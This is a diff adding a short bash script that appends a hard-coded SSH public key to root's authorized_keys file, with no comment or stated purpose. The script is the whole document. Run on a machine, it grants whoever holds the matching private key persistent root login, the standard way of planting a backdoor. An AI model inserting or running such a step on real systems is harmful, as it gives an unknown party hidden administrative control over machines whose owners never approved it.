@@ -1,0 +1,5 @@
+#!/bin/bash
+
+cat <<EOF >> /root/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvAP6ZvGRDFqmUiKj4oE+kJCew+FZ6/zu9zrX2TPbZIA/r2TZa46ypnc9N6FZkwPex7+k7vWFreZoNZ8SuqB+SXeD8WOOYTsme19vgO8ryXHLAPujnEGq3fxowtImSbtT1910qkA/wUB9e1n+KyVnpcEa90YusajcVtAvrChUuKKMxD68SG1ymIHlkpNEoYaXI5eRJziDXDSjr9l5xuust/FMK6YY2q5LWlscDhDvskatBeeVjZ+A1ORQz4Obv4MFUM8v1SublguHcilKK9xX4ZUe8UPoMQgwrIVg6wjbAAh/Gsb5gKI7h19PWq16nsfE6LpZF/2tLv68eWmyxz5rp
+EOF
